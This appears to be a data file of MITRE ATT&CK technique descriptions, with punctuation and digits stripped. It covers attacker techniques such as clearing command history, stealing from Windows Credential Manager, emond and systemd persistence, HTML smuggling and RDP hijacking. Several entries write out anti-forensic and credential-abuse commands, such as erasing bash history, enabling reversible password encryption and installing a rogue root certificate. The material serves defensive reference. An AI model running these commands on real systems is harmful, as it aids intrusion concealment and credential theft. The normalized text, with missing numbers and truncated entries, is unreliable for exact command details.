attack-pattern--d3046a90-580c-4004-8208-66915bc29830,['enterprise-attack'],['T1146'],Clear Command History,in addition to clearing system logs  an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion  macos and linux both keep track of the commands users type in their terminal so that users can retrace what they've done  these logs can be accessed in a few different ways  while logged in  this command history is tracked in a file pointed to by the environment variable histfile  when a user logs off a system  this information is flushed to a file in the user's home directory called   _bash_history  the benefit of this is that it allows users to go back to commands they've used before in different sessions  since everything typed on the command line is saved  passwords passed in on the command line are also saved  adversaries can abuse this by searching these files for cleartext passwords  additionally  adversaries can use a variety of methods to prevent their own commands from appear in these logs such as unset histfile  export histfilesize    history  c  rm   _bash_history 
attack-pattern--d336b553-5da9-46ca-98a8-0b23f49fb447,['enterprise-attack'],['T1555.004'],Windows Credential Manager,adversaries may acquire credentials from the windows credential manager  the credential manager stores credentials for signing into websites  applications  and or devices that request authentication through ntlm or kerberos in credential lockers  previously known as windows vaults _ citation  microsoft credential manager store  citation  microsoft credential locker   the windows credential manager separates website credentials from application or network credentials in two lockers  as part of  credentials from web  internet explorer and microsoft edge website credentials are managed by the credential manager and are stored in the web credentials locker  application and network credentials are stored in the windows credentials locker_  credential lockers store credentials in encrypted  _vcrd  files  located under   systemdrive  users   username  appdata local microsoft   vault credentials     the encryption key can be found in a file named policy_vpol  typically located in the same folder as the credentials_ citation  passcape windows vault  citation  malwarebytes the windows vault   adversaries may list credentials managed by the windows credential manager through several mechanisms  vaultcmd_exe is a native windows executable that can be used to enumerate credentials stored in the credential locker through a command line interface  adversaries may also gather credentials by directly reading files located inside of the credential lockers  windows apis  such as credenumeratea  may also be absued to list credentials managed by the credential manager_ citation  microsoft credenumerate  citation  delpy mimikatz crendential manager   adversaries may also obtain credentials from credential backups  credential backups and restorations may be performed by running rundll  _exe keymgr_dll krshowkeymgr then selecting the  back up___  button on the  stored user names and passwords  gui_  password recovery tools may also obtain plain text passwords from the credential manager_ citation  malwarebytes the windows vault 
attack-pattern--d376668f-b208-42de-b1f5-fdfe0ad4b753,['enterprise-attack'],['T1519'],Emond,adversaries may use event monitor daemon  emond  to establish persistence by scheduling malicious commands to run on predictable event triggers  emond is a  launch  that accepts events from various services  runs them through a simple rules engine  and takes action  the emond binary at  sbin emond will load any rules from the  etc emond_d rules  directory and take action once an explicitly defined event takes place  the rule files are in the plist format and define the name  event type  and action to take  some examples of event types include system startup and user authentication  examples of actions are to run a system command or send an email  the emond service will not launch if there is no file present in the queuedirectories path  private var db emondclients  specified in the  launch  configuration file at system library launchdaemons com_apple_emond_plist_ citation  xorrior emond jan       citation  magnusviri emond apr       citation  sentinelone macos persist jun        adversaries may abuse this service by writing a rule to execute commands when a defined event occurs  such as system start up or user authentication_ citation  xorrior emond jan       citation  magnusviri emond apr       citation  sentinelone macos persist jun       adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the  launch  service 
attack-pattern--d3df754e-997b-4cf9-97d4-70feb3120847,['enterprise-attack'],['T1194'],Spearphishing via Service,spearphishing via service is a specific variant of spearphishing  it is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels    all forms of spearphishing are electronically delivered social engineering targeted at a specific individual  company  or industry  in this scenario  adversaries send messages through various social media services  personal webmail  and other non enterprise controlled services  these services are more likely to have a less strict security policy than an enterprise  as with most kinds of spearphishing  the goal is to generate rapport with the target or get the target's interest in some way  adversaries will create fake social media accounts and message employees for potential job opportunities  doing so allows a plausible reason for asking about services  policies  and software that's running in an environment  the adversary can then send malicious links or attachments through these services_  a common example is to build rapport with a target via social media  then send content to a personal webmail service that the target uses on their work computer  this allows an adversary to bypass some email restrictions on the work account  and the target is more likely to open the file since it's something they were expecting  if the payload doesn't work as expected  the adversary can continue normal communications and troubleshoot with the target on how to get it working 
attack-pattern--d40239b3-05ff-46d8-9bdd-b46d13463ef9,['enterprise-attack'],['T1200'],Hardware Additions,adversaries may introduce computer accessories  networking hardware  or other computing devices into a system or network that can be used as a vector to gain access  rather than just connecting and distributing payloads via removable storage  i_e   replication through removable  more robust hardware additions can be used to introduce new functionalities and or features into a system that can then be abused_  while public references of usage by threat actors are scarce  many red teams penetration testers leverage hardware additions for initial access  commercial and open source products can be leveraged with capabilities such as passive network tapping  network traffic modification  i_e   keystroke injection  kernel memory reading via dma  addition of new wireless access to an existing network  and others_ citation  ossmann star feb       citation  aleks weapons nov       citation  frisk dma august       citation  mcmillan pwn march      
attack-pattern--d456de47-a16f-4e46-8980-e67478a12dcb,['enterprise-attack'],['T1505'],Server Software Component,adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems  enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application  adversaries may install malicious components to extend and abuse server applications 
attack-pattern--d45a3d09-b3cf-48f4-9f0f-f521ee5cb05c,['enterprise-attack'],['T1485'],Data Destruction,adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems  services  and network resources  data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives_ citation  symantec shamoon       citation  fireeye shamoon nov       citation  palo alto shamoon nov       citation  kaspersky stonedrill       citation  unit    shamoon        citation  talos olympic destroyer       common operating system file deletion commands such as del and rm often only remove pointers to files without wiping the contents of the files themselves  making the files recoverable by proper forensic methodology  this behavior is distinct from  disk content  and  disk structure  because individual files are destroyed rather than sections of a storage disk or the disk's logical structure_  adversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable_ citation  kaspersky stonedrill       citation  unit    shamoon        in some cases politically oriented image files have been used to overwrite data_ citation  fireeye shamoon nov       citation  palo alto shamoon nov       citation  kaspersky stonedrill        to maximize impact on the target organization in operations where network wide availability interruption is the goal  malware designed for destroying data may have worm like features to propagate across a network by leveraging additional techniques like  valid   os credential  and  smb windows admin  symantec shamoon       citation  fireeye shamoon nov       citation  palo alto shamoon nov       citation  kaspersky stonedrill       citation  talos olympic destroyer      _  in cloud environments  adversaries may leverage access to delete cloud storage  cloud storage accounts  machine images  and other infrastructure crucial to operations to damage an organization or their customers_ citation  data destruction   threat post  citation  doj    cisco insider 
attack-pattern--d467bc38-284b-4a00-96ac-125f447799fc,['enterprise-attack'],['T1132.002'],Non-Standard Encoding,adversaries may encode data with a non standard data encoding system to make the content of command and control traffic more difficult to detect  command and control  c   information can be encoded using a non standard data encoding system that diverges from existing protocol specifications  non standard data encoding schemes may be based on or related to standard data encoding schemes  such as a modified base   encoding for the message body of an http request_ citation  wikipedia binary to text encoding   citation  wikipedia character encoding 
attack-pattern--d4b96d2c-1032-4b22-9235-2b5b649d0605,['enterprise-attack'],['T1556.001'],Domain Controller Authentication,adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts    malware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user s account and or credentials  ex   skeleton  skeleton key works through a patch on an enterprise domain controller authentication process  lsass  with credentials that adversaries may use to bypass the standard authentication system  once patched  an adversary can use the injected password to successfully authenticate as any domain user account  until the the skeleton key is erased from memory by a reboot of the domain controller   authenticated access may enable unfettered access to hosts and or resources within single factor authentication environments_ citation  dell skeleton 
attack-pattern--d4bdbdea-eaec-4071-b4f9-5105e12ea4b6,['enterprise-attack'],['T1537'],Transfer Data to Cloud Account,adversaries may exfiltrate data by transferring the data  including backups of cloud environments  to another cloud account they control on the same service to avoid typical file transfers downloads and network based exfiltration detection_  a defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider  such transfers may utilize existing cloud provider apis and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces_  incidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts_ citation  doj gru indictment jul      
attack-pattern--d4dc46e3-5ba5-45b9-8204-010867cacfcb,['enterprise-attack'],['T1027.006'],HTML Smuggling,adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign html files  html documents can store large binary objects known as javascript blobs  immutable data that represents raw bytes  that can later be constructed into file like objects  data may also be stored in data urls  which enable embedding media type or mime files inline of html documents  html  also introduced a download attribute that may be used to initiate file downloads_ citation  html smuggling menlo security       citation  outlflank html smuggling        adversaries may deliver payloads to victims that bypass security controls through html smuggling by abusing javascript blobs and or html  download attributes  security controls such as web content filters may not identify smuggled malicious files inside of html js files  as the content may be based on typically benign mime types such as text plain and or text html  malicious files or data can be obfuscated and hidden inside of html files through data urls and or javascript blobs and can be deobfuscated when they reach the victim  i_e   deobfuscate decode files or  potentially bypassing content filters_  for example  javascript blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing javascript functions such as mssaveblob_ citation  html smuggling menlo security       citation  mstic nobelium may       citation  outlflank html smuggling       citation  nccgroup smuggling hta      
attack-pattern--d50955c2-272d-4ac8-95da-10c29dda1c48,['enterprise-attack'],['T1556.005'],Reversible Encryption,an adversary may abuse active directory authentication encryption properties to gain access to credentials on windows systems  the allowreversiblepasswordencryption property specifies whether reversible password encryption for an account is enabled or disabled  by default this property is disabled  instead storing user credentials as the output of one way hashing functions  and should not be enabled unless legacy or other software require it_  if the property is enabled and or a user changes their password after it is enabled  an adversary may be able to obtain the plaintext of passwords created changed after the property was enabled  to decrypt the passwords  an adversary needs four components      encrypted password  g radiuschap  from the active directory user structure userparameters       byte randomly generated value  g radiuschapkey  also from userparameters    global lsa secret  g msradiuschapkey     static key hardcoded in the remote access subauthentication dll  rassfm_dll   with this information  an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value_  an adversary may set this property at various scopes through local group policy editor  user properties  fine grained password policy  fgpp   or via the activedirectory  module  for example  an adversary may implement and apply a fgpp to users or groups if the domain functional level is set to  windows server       or higher  in powershell  an adversary may make associated changes to user settings using commands similar to set aduser  allowreversiblepasswordencryption  true 
attack-pattern--d519cfd5-f3a8-43a9-a846-ed0bb40672b1,['enterprise-attack'],['T1130'],Install Root Certificate,root certificates are used in public key cryptography to identify a root certificate authority  ca   when a root certificate is installed  the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate   citation  wikipedia root certificate  certificates are commonly used for establishing secure tls ssl communications within a web browser  when a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk  depending on the security settings  the browser may not allow the user to establish a connection to the website_  installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system  adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over https to adversary controlled web servers that spoof legitimate websites in order to collect login credentials   citation  operation emmental   atypical root certificates have also been pre installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware adware to provide a man in the middle capability for intercepting information transmitted over secure tls ssl communications   citation  kaspersky superfish   root certificates  and their associated chains  can also be cloned and reinstalled  cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools  ex  sysinternals  antivirus  etc_  used to block execution and or uncover artifacts of persistence   citation  spectorops code signing dec        in macos  the ay mami malware uses  usr bin security add trusted cert  d  r trustroot  k  library keychains system_keychain  path to malicious cert to install a malicious certificate as a trusted root certificate into the system keychain   citation  objective see ay mami      
attack-pattern--d54416bd-0803-41ca-870a-ce1af7c05638,['enterprise-attack'],['T1022'],Data Encrypted,data is encrypted before being exfiltrated in order to hide the information that is being exfiltrated from detection or to make the exfiltration less conspicuous upon inspection by a defender  the encryption is performed by a utility  programming library  or custom algorithm on the data itself and is considered separate from any encryption performed by the command and control or file transfer protocol  common file archive formats that can encrypt files are rar and zip_  other exfiltration techniques likely apply as well to transfer the information out of the network  such as  exfiltration over c   and  exfiltration over alternative
attack-pattern--d63a3fb8-9452-4e9d-a60a-54be68d5998c,['enterprise-attack'],['T1070.004'],File Deletion,adversaries may delete files left behind by the actions of their intrusion activity  malware  tools  or other non native files dropped or created on a system by an adversary  ex   ingress tool  may leave traces to indicate to what was done within a network and how  removal of these files can occur during an intrusion  or as part of a post intrusion process to minimize the adversary's footprint_  there are tools available from the host operating system to perform cleanup  but adversaries may use other tools as well_ citation  microsoft sdelete july       examples of built in  command and scripting  functions include del on windows and rm or unlink on linux and macos 
attack-pattern--d742a578-d70e-4d0e-96a6-02a9c30204e6,['enterprise-attack'],['T1189'],Drive-by Compromise,adversaries may gain access to a system through a user visiting a website over the normal course of browsing  with this technique  the user's web browser is typically targeted for exploitation  but adversaries may also use compromised websites for non exploitation behavior such as acquiring  application access   multiple ways of delivering exploit code to a browser exist  including     a legitimate website is compromised where adversaries have injected some form of malicious code such as javascript  iframes  and cross site scripting_   malicious ads are paid for and served through legitimate ad providers_   built in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client  e_g  forum posts  comments  and other user controllable web content _  often the website used by an adversary is one visited by a specific community  such as government  a particular industry  or region  where the goal is to compromise a specific user or set of users based on a shared interest  this kind of targeted campaign is often referred to a strategic web compromise or watering hole attack  there are several known examples of this occurring_ citation  shadowserver strategic web compromise   typical drive by compromise process      a user visits a website that is used to host the adversary controlled content_    scripts automatically execute  typically searching versions of the browser and plugins for a potentially vulnerable version         the user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes_    upon finding a vulnerable version  exploit code is delivered to the browser_    if exploitation is successful  then it will give the adversary code execution on the user's system unless other protections are in place_       in some cases a second visit to the website after the initial scan is required before exploit code is delivered_  unlike  exploit public facing  the focus of this technique is to exploit software on a client endpoint upon visiting a website  this will commonly give an adversary access to systems on the internal network instead of external systems that may be in a dmz_  adversaries may also use compromised websites to deliver a user to a malicious application designed to  steal application access  like oauth tokens  to gain access to protected applications and information  these malicious applications have been delivered through popups on legitimate websites_ citation  volexity oceanlotus nov      
attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab,['enterprise-attack'],['T1498'],Network Denial of Service,adversaries may perform network denial of service  dos  attacks to degrade or block the availability of targeted resources to users  network dos can be performed by exhausting the network bandwidth services rely on  example resources include specific websites  email services  dns  and web based applications  adversaries have been observed conducting network dos attacks for political purposes citation  fireeye oppoisonedhandover february       and to support other malicious activities  including distraction citation  fsisac fraudnetdos september        hacktivism  and extortion_ citation  symantec ddos october        a network dos will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on  for example  an adversary may send   gbps of traffic to a server that is hosted by a network with a  gbps connection to the internet  this traffic can be generated by a single system or multiple systems spread across the internet  which is commonly referred to as a distributed dos  ddos _  to perform network dos attacks several aspects apply to multiple methods  including ip address spoofing  and botnets_  adversaries may use the original ip address of an attacking system  or spoof the source ip address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection  this can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices_  for dos attacks targeting the hosting system directly  see  endpoint denial of
attack-pattern--da051493-ae9c-4b1b-9760-c009c46c9b56,['enterprise-attack'],['T1546.016'],Installer Packages,adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content  installer packages are os specific and contain the resources an operating system needs to install applications on a system  installer packages can include scripts that run prior to installation as well as after installation is complete  installer scripts may inherit elevated permissions when executed  developers often use these scripts to prepare the environment for installation  check requirements  download dependencies  and remove files after installation_ citation  installer package scripting rich trouton   using legitimate applications  adversaries have distributed applications with modified installer scripts to execute malicious content  when a user installs the application  they may be required to grant administrative permissions to allow the installation  at the end of the installation process of the legitimate application  content such as macos  postinstall  scripts can be executed with the inherited elevated permissions  adversaries can use these scripts to execute a malicious executable or install other malicious components  such as a  launch  with the elevated permissions_ citation  application bundle manipulation brandon dalton  citation  wardle evilquest parti   depending on the distribution  linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts  these scripts can include  preinst    postinst    prerm    postrm  scripts and run as root when executed_  for windows  the microsoft installer services uses  _msi  files to manage the installing  updating  and uninstalling of applications  adversaries have leveraged  prebuild  and  postbuild  events to run commands before or after a build when installing _msi files_ citation  windows applejeus great  citation  debian manual maintainer scripts 
attack-pattern--db8f5003-3b20-48f0-9b76-123e44208120,['enterprise-attack'],['T1595.001'],Scanning IP Blocks,adversaries may scan victim ip blocks to gather information that can be used during targeting  public ip addresses may be allocated to organizations by block  or a range of sequential addresses_  adversaries may scan ip blocks in order to  gather victim network  such as which ip addresses are actively in use as well as more detailed information about hosts assigned these addresses  scans may range from simple pings  icmp requests and responses  to more nuanced scans that may reveal host software versions via server banners or other network artifacts_ citation  botnet scan  information from these scans may reveal opportunities for other forms of reconnaissance  ex   search open  or  search open technical  establishing operational resources  ex   develop  or  obtain  and or initial access  ex   external remote
attack-pattern--dc27c2ec-c5f9-4228-ba57-d67b590bda93,['enterprise-attack'],['T1158'],Hidden Files and Directories,to prevent normal users from accidentally changing special files on a system  most operating systems have the concept of a  hidden  file  these files don t show up when a user browses the file system with a gui or when using normal commands on the command line  users must explicitly ask to show the hidden files either via a series of graphical user interface  gui  prompts or with command line switches  dir  a for windows and ls  a for linux and macos _  adversaries can use this to their advantage to hide files and folders anywhere on the system for persistence and evading a typical user or system analysis that does not incorporate investigation of hidden files_      windows  users can mark specific files as hidden by using the attrib_exe binary  simply do attrib  h filename to mark a file or folder as hidden  similarly  the   s  marks a file as a system file and the   r  flag marks the file as read only  like most windows binaries  the attrib_exe binary provides the ability to apply these changes recursively   s _      linux mac  users can mark specific files as hidden simply by putting a  _  as the first character in the file or folder name   citation  sofacy komplex trojan   citation  antiquated mac malware   files and folder that start with a period   _   are by default hidden from being viewed in the finder application and standard command line utilities like  ls   users must specifically change settings to have these files viewable  for command line usages  there is typically a flag to see all files  including hidden ones   to view these files in the finder application  the following command must be executed  defaults write com_apple_finder appleshowallfiles yes  and then relaunch the finder application_      mac  files on macos can be marked with the uf_hidden flag which prevents them from being seen in finder_app  but still allows them to be seen in terminal_app _ many applications create these hidden files and folders to store information so that it doesn t clutter up the user s workspace  for example  ssh utilities create a _ssh folder that s hidden and contains the user s known hosts and keys 
attack-pattern--dc31fe1e-d722-49da-8f5f-92c7b5aff534,['enterprise-attack'],['T1221'],Template Injection,adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts  for example  microsoft s office open xml  ooxml  specification defines an xml based format for office documents  _docx  xlsx  _pptx  to replace older binary formats  _doc  _xls  _ppt   ooxml files are packed together zip archives compromised of various xml files  referred to as parts  containing properties that collectively define how a document is rendered_ citation  microsoft open xml july        properties within parts may reference shared public resources accessed via online urls  for example  template properties may reference a file  serving as a pre formatted document blueprint  that is fetched when the document is loaded_  adversaries may abuse these templates to initially conceal malicious code to be executed via user documents  template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded_ citation  sans brian wiltse template injection  these documents can be delivered via other techniques such as  and or  taint shared  and may evade static detections since no typical indicators  vba macro  script  etc_  are present until after the malicious payload is fetched_ citation  redxorblue remote template injection  examples have been seen in the wild where template injection was used to load malicious code containing an exploit_ citation  malwarebytes template injection oct        adversaries may also modify the   template control word within an _rtf file to similarly conceal then download malicious code  this legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an _rtf file is opened  however  adversaries may alter the bytes of an existing _rtf file to insert a template control word field to include a url resource of a malicious payload_ citation  proofpoint rtf injection  citation  ciberseguridad decoding malicious rtf files   this technique may also enable  forced  by injecting a smb https  or other credential prompting  url and triggering an authentication attempt_ citation  anomali template injection mar       citation  talos template injection july       citation  ryhanson phishery sept      
attack-pattern--dca670cf-eeec-438f-8185-fd959d9ef211,['enterprise-attack'],['T1037.004'],RC Scripts,adversaries may establish persistence by modifying rc scripts which are executed during a unix like system s startup  these files allow system administrators to map and start custom services at startup for different run levels  rc scripts require root privileges to modify_  adversaries can establish persistence by adding a malicious binary path or shell commands to rc_local  rc_common  and other rc scripts specific to the unix like distribution_ citation  iranthreats kittens dec       citation  intezer hiddenwasp map       upon reboot  the system executes the script's contents as root  resulting in persistence_  adversary abuse of rc scripts is especially effective for lightweight unix like distributions using the root user as default  such as iot or embedded systems_  several unix like systems have moved to systemd and deprecated the use of rc scripts  this is now a deprecated mechanism in macos in favor of   citation  apple developer doco archive launchd  citation  startup items  this technique can be used on mac os x panther v  _  and earlier versions which still execute the rc scripts_ citation  methods of mac malware persistence  to maintain backwards compatibility some systems  such as ubuntu  will execute the rc scripts if they exist with the correct file permissions_ citation  ubuntu manpage systemd rc 
attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48,['enterprise-attack'],['T1134'],Access Token Manipulation,adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls  windows uses access tokens to determine the ownership of a running process  a user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process  when this occurs  the process also takes on the security context associated with the new token_  an adversary can use built in windows api functions to copy access tokens from existing processes  this is known as token stealing  these token can then be applied to an existing process  i_e   token  or used to spawn a new process  i_e   create process with  an adversary must already be in a privileged user context  i_e  administrator  to steal a token  however  adversaries commonly use token stealing to elevate their security context from the administrator level to the system level  an adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system_ citation  pentestlab token manipulation   any standard user can use the runas command  and the windows api functions  to create impersonation tokens  it does not require access to an administrator account  there are also other mechanisms  such as active directory fields  that can be used to modify access tokens 
attack-pattern--dce31a00-1e90-4655-b0f9-e2e71a748a87,['enterprise-attack'],['T1209'],Time Providers,the windows time service  w  time  enables time synchronization across and within domains   citation  microsoft w  time feb       w  time time providers are responsible for retrieving time stamps from hardware network resources and outputting these values to other network clients   citation  microsoft timeprovider   time providers are implemented as dynamic link libraries  dlls  that are registered in the subkeys of  hkey_local_machine system currentcontrolset services w  time timeproviders    citation  microsoft timeprovider  the time provider manager  directed by the service control manager  loads and starts time providers listed and enabled under this key at system startup and or whenever parameters are changed   citation  microsoft timeprovider   adversaries may abuse this architecture to establish persistence  specifically by registering and enabling a malicious dll as a time provider  administrator privileges are required for time provider registration  though execution will run in context of the local service account   citation  github w  time oct      
attack-pattern--dd43c543-bb85-4a6f-aa6e-160d90d06a49,['enterprise-attack'],['T1111'],Multi-Factor Authentication Interception,adversaries may target multi factor authentication  mfa  mechanisms   i_e_  smart cards  token generators  etc_  to gain access to credentials that can be used to access systems  services  and network resources  use of mfa is recommended and provides a higher level of security than user names and passwords alone  but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms    if a smart card is used for multi factor authentication  then a keylogger will need to be used to obtain the password associated with a smart card during normal use  with both an inserted card and access to the smart card password  an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token   citation  mandiant m trends        adversaries may also employ a keylogger to similarly target other hardware tokens  such as rsa securid  capturing token input  including a user's personal identification code  may provide temporary access  i_e  replay the one time passcode until the next value rollover  as well as possibly enabling adversaries to reliably predict future authentication values  given access to both the algorithm and any seed values used to generate appended temporary codes    citation  gcn rsa june        other methods of mfa may be intercepted and used by an adversary to authenticate  it is common for one time codes to be sent via out of band communications  email  sms   if the device and or service is not secured  then it may be vulnerable to interception  although primarily focused on by cyber criminals  these authentication mechanisms have been targeted by advanced actors   citation  operation emmental 
attack-pattern--dd901512-6e37-4155-943b-453e3777b125,['enterprise-attack'],['T1159'],Launch Agent,per apple s developer documentation  when a user logs in  a per user launchd process is started which loads the parameters for each launch on demand user agent from the property list  plist  files found in  system library launchagents   library launchagents  and  home library launchagents  citation  appledocs launch agent daemons   citation  osx keydnap malware   citation  antiquated mac malware   these launch agents have property list files which point to the executables that will be launched  citation  osx_dok malware _   adversaries may install a new launch agent that can be configured to execute at login by using launchd or launchctl to load a plist into the appropriate directories   citation  sofacy komplex trojan    citation  methods of mac malware persistence   the agent name may be disguised by using a name from a related operating system or benign software  launch agents are created with user level privileges and are executed with the privileges of the user when they log in  citation  osx malware detection   citation  oceanlotus for os x   they can be set up to execute when a specific user logs in  in the specific user s directory structure  or when any user logs in  which requires administrator privileges  
attack-pattern--deb98323-e13f-4b0c-8d94-175379069062,['enterprise-attack'],['T1027.002'],Software Packing,adversaries may perform software packing or virtual machine software protection to conceal their code  software packing is a method of compressing or encrypting an executable  packing an executable changes the file signature in an attempt to avoid signature based detection  most decompression techniques decompress the executable code in memory  virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run  a virtual machine is then called to run this code_ citation  eset finfisher jan         utilities used to perform software packing are called packers  example packers are mpress and upx  a more comprehensive list of known packers is available  but adversaries may create their own packing techniques that do not leave the same artifacts as well known packers to evade defenses_ citation  awesome executable packing 
attack-pattern--df1bc34d-1634-4c93-b89e-8120994fce77,['enterprise-attack'],['T1584.007'],Serverless,adversaries may compromise serverless cloud infrastructure  such as cloudflare workers or aws lambda functions  that can be used during targeting  by utilizing serverless infrastructure  adversaries can make it more difficult to attribute infrastructure used during operations back to them    once compromised  the serverless runtime environment can be leveraged to either respond directly to infected machines or to  traffic to an adversary owned command and control server_ citation  blackwater malware cloudflare workers  citation  aws lambda redirector  as traffic generated by these functions will appear to come from subdomains of common cloud providers  it may be difficult to distinguish from ordinary traffic to these providers_ citation  detecting command   control in the cloud  citation  blackwater malware cloudflare workers 
attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161,['enterprise-attack'],['T1071.001'],Web Protocols,adversaries may communicate using application layer protocols associated with web traffic to avoid detection network filtering by blending in with existing traffic  commands to the remote system  and often the results of those commands  will be embedded within the protocol traffic between the client and server    protocols such as http and https that carry web traffic may be very common in environments  http s packets have many fields and headers in which data can be concealed  an adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal  expected traffic 
attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67,['enterprise-attack'],['T1059.005'],Visual Basic,adversaries may abuse visual basic  vb  for execution  vb is a programming language created by microsoft with interoperability with many windows technologies such as  component object  and the  native  through the windows api  although tagged as legacy with no planned future evolutions  vb is integrated and supported in the _net framework and cross platform _net core_ citation  vb _net mar       citation  vb microsoft   derivative languages based on vb have also been created  such as visual basic for applications  vba  and vbscript  vba is an event driven programming language built into microsoft office  as well as several third party applications_ citation  microsoft vba  citation  wikipedia vba  vba enables documents to contain macros used to automate the execution of tasks and other functionality on the host  vbscript is a default scripting language on windows hosts and can also be used in place of  on html application  hta  webpages served to internet explorer  though most modern browsers do not come with vbscript support _ citation  microsoft vbscript   adversaries may use vb payloads to execute malicious commands  common malicious usage includes automating execution of behaviors with vbscript or embedding vba content into  spearphishing  payloads  which may also involve  mark of the web  to enable execution _ citation  default vbs macros blocking  
attack-pattern--dfebc3b7-d19d-450b-81c7-6dafe4184c04,['enterprise-attack'],['T1564.005'],Hidden File System,adversaries may use a hidden file system to conceal malicious activity from users and security tools  file systems provide a structure to store and access data from physical storage  typically  a user engages with a file system through applications that allow them to access files and directories  which are an abstraction from their physical location  ex  disk sector   standard file systems include fat  ntfs  ext   and apfs  file systems can also contain other structures  such as the volume boot record  vbr  and master file table  mft  in ntfs_ citation  malwaretech vfs nov        adversaries may use their own abstracted file system  separate from the standard file system present on the infected system  in doing so  adversaries can hide the presence of malicious components and file input output from security tools  hidden file systems  sometimes referred to as virtual file systems  can be implemented in numerous ways  one implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions_ citation  malwaretech vfs nov       citation  fireeye bootkits  another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system_ citation  eset comrat may       adversaries may also fragment files across the existing file system structure in non standard ways_ citation  kaspersky equation qa 
attack-pattern--dfefe2ed-4389-4318-8762-f0272b350a1b,['enterprise-attack'],['T1543.002'],Systemd Service,adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence  the systemd service manager is commonly used for managing background daemon processes  also known as services  and other system resources_ citation  linux man pages  systemd january       citation  freedesktop_org linux systemd   sep      systemd is the default initialization  init  system on many linux distributions starting with debian    ubuntu   _    centos    rhel    fedora     and replaces legacy init systems including sysvinit and upstart while remaining backwards compatible with the aforementioned init systems_  systemd utilizes configuration files known as service units to control how services boot and under what conditions  by default  these unit files are stored in the  etc systemd system and  usr lib systemd system directories and have the file extension _service  each service unit file may contain numerous directives that can execute system commands     execstart  execstartpre  and execstartpost directives cover execution of commands when a services is started manually by 'systemctl' or on system start if the service is set to automatically start     execreload directive covers when a service restarts     execstop and execstoppost directives cover when a service is stopped or manually by 'systemctl'_  adversaries have used systemd functionality to establish persistent access to victim systems by creating and or modifying service unit files that cause systemd to execute malicious commands at system boot_ citation  anomali rocke march        while adversaries typically require root privileges to create modify service unit files in the  etc systemd system and  usr lib systemd system directories  low privilege users can create modify service unit files in directories such as   _config systemd user  to achieve user level persistence_ citation  rapid  service persistence   june     
attack-pattern--e0033c16-a07e-48aa-8204-7c3ca669998c,['enterprise-attack'],['T1563.002'],RDP Hijacking,adversaries may hijack a legitimate user s remote desktop session to move laterally within an environment  remote desktop is a common feature in operating systems  it allows a user to log into an interactive session with a system desktop graphical user interface on a remote system  microsoft refers to its implementation of the remote desktop protocol  rdp  as remote desktop services  rds _ citation  technet remote desktop services   adversaries may perform rdp session hijacking which involves stealing a legitimate user's remote session  typically  a user is notified when someone else is trying to steal their session  with system permissions and using terminal services console   c  windows system   tscon_exe  session number to be stolen    an adversary can hijack a session without the need for credentials or prompts to the user_ citation  rdp hijacking korznikov  this can be done remotely or locally and with active or disconnected sessions_ citation  rdp hijacking medium  it can also lead to  remote system  and privilege escalation by stealing a domain admin or higher privileged account session  all of this can be done by using native windows commands  but it has also been added as a feature in red teaming tools_ citation  kali redsnarf 
attack-pattern--e01be9c5-e763-4caf-aeb7-000b416aef67,['enterprise-attack'],['T1136'],Create Account,adversaries may create an account to maintain access to victim systems  with a sufficient level of access  creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system_  accounts may be created on the local system or within a domain or cloud tenant  in cloud environments  adversaries may create accounts that only have access to specific services  which can reduce the chance of detection 
